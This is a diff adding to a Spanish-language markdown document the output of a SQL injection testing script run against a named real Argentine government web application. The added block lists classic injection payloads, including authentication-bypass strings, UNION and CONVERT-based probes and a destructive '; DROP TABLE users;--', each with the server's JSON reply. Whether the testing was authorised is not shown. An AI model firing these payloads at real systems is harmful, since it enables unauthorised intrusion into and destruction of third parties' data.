@@ -596,8 +596,26 @@ mucho tiempo...
                             
                             test_sql_injection(target_url, sql_payloads) 
                     
-      ```      
-    
+      ```
+      respuesta:
+      ```text
+                    [+] Testing SQL Injection on: https://siper.vialidad.gob.ar/go/app-index-x.php
+                    [!] Possible SQLi with payload: ' OR '1'='1'-- -
+                    Response: {"0":"'or'1'='1'---","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
+                    [!] Possible SQLi with payload: admin'--
+                    Response: {"0":"admin'--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
+                    [!] Possible SQLi with payload: ' UNION SELECT NULL-- -
+                    Response: {"0":"'unionselectnull---","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
+                    [!] Possible SQLi with payload: '; DROP TABLE users;--
+                    Response: {"0":"';droptableusers;--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
+                    [!] Possible SQLi with payload: ' OR 1=1#
+                    Response: {"0":"'or1=1#","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
+                    [!] Possible SQLi with payload: admin'/*
+                    Response: {"0":"admin'/*","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}...
+                    [!] Possible SQLi with payload: ' AND 1=CONVERT(int,(SELECT user))--
+                    Response: {"0":"'and1=convert(int,(selectuser))--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}
+                       
+      ```               
 
 
 ## Delivery
